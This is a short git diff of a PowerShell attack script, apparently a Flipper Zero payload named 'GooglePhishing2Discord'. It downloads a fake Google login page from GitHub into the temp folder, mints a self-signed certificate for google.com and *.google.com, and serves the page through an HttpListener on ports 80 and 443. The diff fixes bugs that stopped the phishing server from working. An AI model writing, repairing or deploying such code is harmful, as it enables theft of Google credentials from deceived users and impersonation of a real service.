@@ -1,6 +1,6 @@
 if(-not (Test-Path -Path "$env:temp\gph.html" -PathType Leaf)){
     Invoke-RestMethod "https://raw.githubusercontent.com/Agente404/flipper/main/payloads/GooglePhishing2Discord/index.html" -OutFile "$env:temp\gph.html" | Wait-Process;
-    $cert = New-SelfSignedCertificate -Subject *.google.com -DnsName google.com, *.google.com Cert:\CurrentUser\My | Wait-Process
+    $cert = New-SelfSignedCertificate -Subject *.google.com -DnsName google.com, *.google.com -CertStoreLocation Cert:\CurrentUser\My | Wait-Process
     Write-Output $cert
 }
 
@@ -55,7 +55,7 @@ function Handle-Request{
 
 $http = New-Object System.Net.HttpListener;
 $http.Prefixes.Add(('http://' + $url + ':80/'));
-$https.Prefixes.Add(('https://' + $url + ':443/'));
+$http.Prefixes.Add(('https://' + $url + ':443/'));
 $http.Start();
 
 while ($http.IsListening) {
